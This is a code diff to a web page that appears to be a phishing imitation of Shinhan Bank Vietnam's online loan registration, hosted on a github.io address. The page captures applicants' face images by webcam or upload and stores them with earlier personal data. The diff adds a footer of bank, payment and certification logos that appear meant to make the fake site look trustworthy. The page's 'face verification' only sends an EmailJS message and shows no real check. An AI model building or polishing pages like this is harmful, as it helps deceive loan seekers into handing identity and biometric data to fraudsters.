@@ -108,8 +108,9 @@
         }
         .webcam-container {
             position: relative;
-            width: 320px;
-            height: 240px;
+            width: 100%;
+            max-width: 320px;
+            aspect-ratio: 4 / 3;
             margin: 0 auto;
         }
         .face-overlay {
@@ -165,6 +166,24 @@
         .modal-body img {
             max-width: 100%;
         }
+        .partner-logos {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 20px;
+        }
+        .partner-logos img {
+            max-height: 40px;
+            object-fit: contain;
+            transition: opacity 0.3s;
+        }
+        .partner-logos img:hover {
+            opacity: 0.8;
+        }
+        .partner-logos img[onerror] {
+            display: none;
+        }
         @media (max-width: 768px) {
             .navbar-brand img {
                 height: 40px;
@@ -195,15 +214,17 @@
                 width: 100%;
                 margin-bottom: 10px;
             }
-            .webcam-container, #webcam {
-                width: 100% !important;
-                height: auto !important;
+            .webcam-container {
+                max-width: 100%;
             }
             .face-overlay {
                 top: 15%;
                 left: 15%;
                 width: 70%;
                 height: 70%;
+            }
+            .partner-logos img {
+                max-height: 30px;
             }
         }
     </style>
@@ -218,7 +239,7 @@
                 </button>
                 <div class="collapse navbar-collapse" id="navbarNav">
                     <ul class="navbar-nav ms-auto">
-                       <li class="nav-item"><a class="nav-link" href="https://vaytieudung.github.io/shinhanbank/pages/vi/gioi-thieu.html">GIỚI THIỆU</a></li>
+                        <li class="nav-item"><a class="nav-link" href="https://vaytieudung.github.io/shinhanbank/pages/vi/gioi-thieu.html">GIỚI THIỆU</a></li>
                         <li class="nav-item"><a class="nav-link" href="https://vaytieudung.github.io/shinhanbank/pages/vi/tham-chieu.html">LỢI ÍCH</a></li>
                         <li class="nav-item"><a class="nav-link" href="https://vaytieudung.github.io/shinhanbank/pages/vi/lai-suat-vay.html">GIẤY TỜ CẦN THIẾT</a></li>
                         <li class="nav-item"><a class="nav-link active" href="https://vaytieudung.github.io/shinhanbank/pages/vi/loan_registration.html">ĐĂNG KÝ TRỰC TUYẾN</a></li>
@@ -254,7 +275,7 @@
                     <div id="webcamSection" class="accordion-collapse collapse show" data-bs-parent="#faceAccordion">
                         <div class="accordion-body">
                             <div class="webcam-container">
-                                <div id="webcam" style="width: 320px; height: 240px;"></div>
+                                <div id="webcam"></div>
                                 <div class="face-overlay" id="faceOverlay"></div>
                             </div>
                             <p id="webcamStatus" class="text-center mt-2">Đang chờ khuôn mặt...</p>
@@ -269,20 +290,17 @@
                 </div>
                 <div class="accordion-item">
                     <h2 class="accordion-header">
-                        <button class="accordion-button" type="button" data-bs-toggle="collapse" data-bs-target="#uploadSection" aria-expanded="true" aria-controls="uploadSection">
+                        <button class="accordion-button collapsed" type="button" data-bs-toggle="collapse" data-bs-target="#uploadSection" aria-expanded="false" aria-controls="uploadSection">
                             Chọn Ảnh Khuôn Mặt
                         </button>
                     </h2>
-                    <div id="uploadSection" class="accordion-collapse collapse show" data-bs-parent="#faceAccordion">
+                    <div id="uploadSection" class="accordion-collapse collapse" data-bs-parent="#faceAccordion">
                         <div class="accordion-body">
                             <p>Ảnh cần rõ nét, hiển thị toàn bộ khuôn mặt, không chỉnh sửa.</p>
                             <input type="file" id="faceImage" accept="image/jpeg,image/png" aria-label="Tải ảnh khuôn mặt">
                             <div id="faceImagePreview" class="mt-2"></div>
                             <p id="faceImageError" class="error"></p>
                             <p id="faceImageSuccess" class="success-message">Ảnh khuôn mặt đã được tải lên!</p>
-                            <div class="mt-2">
-                                <button class="btn btn-primary" onclick="captureFaceImage()">Chụp ảnh</button>
-                            </div>
                         </div>
                     </div>
                 </div>
@@ -300,7 +318,6 @@
         </div>
     </main>
 
-    <!-- Error Modal -->
     <div class="modal fade" id="errorModal" tabindex="-1" aria-labelledby="errorModalLabel" aria-hidden="true">
         <div class="modal-dialog">
             <div class="modal-content">
@@ -308,9 +325,7 @@
                     <h5 class="modal-title" id="errorModalLabel">Lỗi Webcam</h5>
                     <button type="button" class="btn-close" data-bs-dismiss="modal" aria-label="Close"></button>
                 </div>
-                <div class="modal-body" id="errorModalBody">
-                    <!-- Error message populated dynamically -->
-                </div>
+                <div class="modal-body" id="errorModalBody"></div>
                 <div class="modal-footer">
                     <button type="button" class="btn btn-secondary" data-bs-dismiss="modal">Đóng</button>
                 </div>
@@ -321,7 +336,7 @@
     <footer class="bg-light py-3 mt-4">
         <div class="container text-center">
             <div class="footer-links">
-               <a href="https://shinhan.com.vn/vi/page/chinh-sach-bao-mat.html">Chính sách bảo mật</a> |
+                <a href="https://shinhan.com.vn/vi/page/chinh-sach-bao-mat.html">Chính sách bảo mật</a> |
                 <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/dieu-khoan-su-dung.html">Điều khoản sử dụng</a> |
                 <a href="https://shinhan.com.vn/vi/page/chinh-sach-lien-ket.html">Chính sách Cookies</a> |
                 <a href="https://shinhan.com.vn/vi/page/chinh-sach-lien-ket.html">Miễn khoản từ chối liên kết bên ngoài</a> |
@@ -333,14 +348,27 @@
                 <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/global-shinhan.html">Trang Global Portal</a> |
                 <a href="https://vaytieudung.github.io/shinhanbank/pages/vi/gioi-thieu.html">Giới Thiệu</a>
             </div>
+            <div class="partner-logos">
+                <a href="https://shinhan.com.vn" target="_blank"><img src="https://shinhan.com.vn/public/themes/shinhan/img/shinhan_logo_2.svg" alt="Shinhan Bank Logo"></a>
+                <a href="https://vnpay.vn" target="_blank"><img src="https://pay.vnpay.vn/images/img/logos/bank/big/shinhanbank.svg" alt="VNPay Shinhan Bank Logo"></a>
+                <a href="https://zalopay.vn" target="_blank"><img src="https://pay.vnpay.vn/images/img/logos/bank/big/zalopay.svg" alt="ZaloPay Logo"></a>
+                <img src="https://pay.vnpay.vn/images/img/logos/global-sign.svg" alt="Global Sign Certification">
+                <img src="https://pay.vnpay.vn/images/img/logos/pcidss.svg" alt="PCI DSS Certification">
+                <a href="https://zalo.me" target="_blank"><img src="https://pay.vnpay.vn/images/img/logos/zalo.svg" alt="Zalo Logo"></a>
+                <a href="https://momo.vn" target="_blank"><img src="https://napthengay.vn/media/images/logo/momo_icon_square_pinkbg@3x.png" alt="MoMo Logo"></a>
+                <img src="https://napthengay.vn/media/images/logo/logo-atm@3x.png" alt="ATM Logo">
+                <img src="http://online.gov.vn/Content/EndUser/LogoCCDVSaleNoti/logoCCDV.png" alt="CCDV Certification">
+                <img src="https://napthe.zalopay.vn/static/desktop/images/logos/PCI.svg" alt="ZaloPay PCI Certification">
+                <a href="https://zalopay.vn" target="_blank"><img src="https://gateway.zalopay.vn/pay/v2/images/logo.svg" alt="ZaloPay Gateway Logo"></a>
+            </div>
             <p class="mt-2">Copyright © 2017 by SHINHAN Bank (Vietnam) Ltd,. All rights reserved.</p>
         </div>
     </footer>
 
     <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
     <script>
-        // Initialize EmailJS
-        emailjs.init("OrBsI926QI2_xBh1f"); // Replace with your EmailJS User ID
+        // Initialize EmailJS (Note: In production, store user ID securely, e.g., in environment variables)
+        emailjs.init("OrBsI926QI2_xBh1f");
 
         // Webcam setup
         Webcam.set({
@@ -350,19 +378,37 @@
             jpeg_quality: 90
         });
 
-        // Check for existing registration and load saved image
-        window.onload = function() {
-            const savedData = JSON.parse(localStorage.getItem('registrationData')) || {};
+        function init() {
+            const savedData = getRegistrationData();
             if (savedData.step3?.faceImage) {
                 document.getElementById('faceImagePreview').innerHTML = `<img src="${savedData.step3.faceImage}" alt="Ảnh khuôn mặt" style="max-width: 300px;">`;
                 document.getElementById('faceImageSuccess').style.display = 'block';
                 document.getElementById('faceOverlay').style.display = 'none';
             }
 
-            Webcam.attach('#webcam');
             savedData.currentStep = 3;
             localStorage.setItem('registrationData', JSON.stringify(savedData));
-        };
+
+            setupWebcam();
+            setupFileInput();
+        }
+
+        function getRegistrationData() {
+            return JSON.parse(localStorage.getItem('registrationData')) || {};
+        }
+
+        function setupWebcam() {
+            try {
+                Webcam.attach('#webcam');
+            } catch (error) {
+                showErrorModal(`Không thể khởi động webcam: ${getWebcamErrorMessage(error)}`);
+            }
+        }
+
+        function setupFileInput() {
+            const input = document.getElementById('faceImage');
+            input.addEventListener('change', handleFileUpload);
+        }
 
         function takeSnapshot() {
             const errorElement = document.getElementById('webcamError');
@@ -370,81 +416,72 @@
             const previewElement = document.getElementById('faceImagePreview');
             const faceOverlay = document.getElementById('faceOverlay');
 
-            Webcam.snap(function(data_uri) {
+            clearMessages();
+
+            Webcam.snap(data_uri => {
                 previewElement.innerHTML = `<img src="${data_uri}" alt="Ảnh khuôn mặt" style="max-width: 300px;">`;
                 document.getElementById('webcamStatus').textContent = 'Đã chụp ảnh khuôn mặt.';
-                errorElement.textContent = '';
                 successElement.style.display = 'block';
                 faceOverlay.style.display = 'none';
                 saveImage(data_uri);
                 Webcam.reset();
-            }, function(error) {
-                errorElement.textContent = 'Không thể chụp ảnh. Vui lòng kiểm tra webcam.';
-                document.getElementById('errorModalBody').textContent = 'Lỗi: ' + error + '. Vui lòng đảm bảo webcam được cấp phép và hoạt động.';
-                new bootstrap.Modal(document.getElementById('errorModal')).show();
+            }, error => {
+                errorElement.textContent = getWebcamErrorMessage(error);
+                showErrorModal(`Lỗi: ${getWebcamErrorMessage(error)}. Vui lòng đảm bảo webcam được cấp phép và hoạt động.`);
                 successElement.style.display = 'none';
             });
         }
 
         function resetWebcam() {
+            clearMessages();
             Webcam.reset();
-            Webcam.attach('#webcam');
+            setupWebcam();
             document.getElementById('faceImagePreview').innerHTML = '';
             document.getElementById('webcamStatus').textContent = 'Đang chờ khuôn mặt...';
-            document.getElementById('webcamError').textContent = '';
-            document.getElementById('webcamSuccess').style.display = 'none';
             document.getElementById('faceImage').value = '';
-            document.getElementById('faceImageError').textContent = '';
-            document.getElementById('faceImageSuccess').style.display = 'none';
             document.getElementById('faceOverlay').style.display = 'block';
 
-            const savedData = JSON.parse(localStorage.getItem('registrationData')) || {};
+            const savedData = getRegistrationData();
             if (savedData.step3) {
                 delete savedData.step3.faceImage;
                 localStorage.setItem('registrationData', JSON.stringify(savedData));
             }
         }
 
-        function captureFaceImage() {
-            const input = document.getElementById('faceImage');
-            input.click();
-            input.onchange = function(event) {
-                const file = event.target.files[0];
-                const errorElement = document.getElementById('faceImageError');
-                const successElement = document.getElementById('faceImageSuccess');
-                const previewElement = document.getElementById('faceImagePreview');
+        function handleFileUpload(event) {
+            const file = event.target.files[0];
+            const errorElement = document.getElementById('faceImageError');
+            const successElement = document.getElementById('faceImageSuccess');
+            const previewElement = document.getElementById('faceImagePreview');
 
-                if (!file) {
-                    errorElement.textContent = 'Vui lòng chọn một file hình ảnh.';
-                    successElement.style.display = 'none';
-                    return;
-                }
+            clearMessages();
 
-                if (!['image/jpeg', 'image/png'].includes(file.type)) {
-                    errorElement.textContent = 'Chỉ chấp nhận file JPG hoặc PNG.';
-                    successElement.style.display = 'none';
-                    return;
-                }
+            if (!file) {
+                errorElement.textContent = 'Vui lòng chọn một file hình ảnh.';
+                return;
+            }
 
-                if (file.size > 5 * 1024 * 1024) {
-                    errorElement.textContent = 'File phải nhỏ hơn 5MB.';
-                    successElement.style.display = 'none';
-                    return;
-                }
+            if (!['image/jpeg', 'image/png'].includes(file.type)) {
+                errorElement.textContent = 'Chỉ chấp nhận file JPG hoặc PNG.';
+                return;
+            }
 
-                errorElement.textContent = '';
+            if (file.size > 5 * 1024 * 1024) {
+                errorElement.textContent = 'File phải nhỏ hơn 5MB.';
+                return;
+            }
+
+            const reader = new FileReader();
+            reader.onload = e => {
+                previewElement.innerHTML = `<img src="${e.target.result}" alt="Ảnh khuôn mặt" style="max-width: 300px;">`;
                 successElement.style.display = 'block';
-                const reader = new FileReader();
-                reader.onload = function(e) {
-                    previewElement.innerHTML = `<img src="${e.target.result}" alt="Ảnh khuôn mặt" style="max-width: 300px;">`;
-                    saveImage(e.target.result);
-                };
-                reader.readAsDataURL(file);
+                saveImage(e.target.result);
             };
+            reader.readAsDataURL(file);
         }
 
         function saveImage(dataUrl) {
-            const savedData = JSON.parse(localStorage.getItem('registrationData')) || {};
+            const savedData = getRegistrationData();
             savedData.step3 = savedData.step3 || {};
             savedData.step3.faceImage = dataUrl;
             savedData.currentStep = 3;
@@ -452,36 +489,62 @@
         }
 
         function nextStep() {
-            const faceImage = document.getElementById('faceImage').files[0] || (document.getElementById('faceImagePreview').querySelector('img') && document.getElementById('faceImagePreview').querySelector('img').src);
+            const savedData = getRegistrationData();
+            const faceImage = savedData.step3?.faceImage;
             const errorElement = document.getElementById('faceImageError');
             const spinner = document.querySelector('.spinner');
 
+            clearMessages();
+
             if (!faceImage) {
-                errorElement.textContent = 'Vui lòng tải lên hoặc chụp ảnh khuôn mặt.';
+                errorElement.textContent = 'Vui lòng quét khuôn mặt hoặc tải lên ảnh khuôn mặt.';
                 return;
             }
 
             spinner.style.display = 'inline-block';
 
-            // Send confirmation email
-            const savedData = JSON.parse(localStorage.getItem('registrationData')) || {};
+            // Note: In production, face verification should be done server-side
             const emailParams = {
                 to_email: savedData.step1?.email || 'user@example.com',
                 full_name: savedData.step1?.fullName || 'Khách hàng',
-                message: ' Hồ sơ đang được xét duyệt.'
+                message: 'Hồ sơ đang được xét duyệt.'
             };
 
             emailjs.send('service_60tgxof', 'template_uhyb8ve', emailParams)
                 .then(() => {
-                    console.log('Face verification email sent');
                     spinner.style.display = 'none';
                     window.location.href = 'https://vaytieudung.github.io/shinhanbank/pages/vi/step4.html';
-                }, (error) => {
+                }, error => {
                     console.error('Email sending failed:', error);
-                    alert('Xác thực không thành công.Khuôn mặt không trùng khớp. Vui lòng thử lại.');
+                    errorElement.textContent = 'Xác thực không thành công. Vui lòng thử lại.';
                     spinner.style.display = 'none';
                 });
         }
+
+        function clearMessages() {
+            document.getElementById('webcamError').textContent = '';
+            document.getElementById('webcamSuccess').style.display = 'none';
+            document.getElementById('faceImageError').textContent = '';
+            document.getElementById('faceImageSuccess').style.display = 'none';
+        }
+
+        function getWebcamErrorMessage(error) {
+            if (error.name === 'NotAllowedError') {
+                return 'Quyền truy cập webcam bị từ chối. Vui lòng cấp phép trong cài đặt trình duyệt.';
+            } else if (error.name === 'NotFoundError') {
+                return 'Không tìm thấy webcam. Vui lòng kết nối một webcam.';
+            } else {
+                return 'Lỗi không xác định khi truy cập webcam.';
+            }
+        }
+
+        function showErrorModal(message) {
+            document.getElementById('errorModalBody').textContent = message;
+            new bootstrap.Modal(document.getElementById('errorModal')).show();
+        }
+
+        // Initialize page
+        window.onload = init;
     </script>
 </body>
 </html>
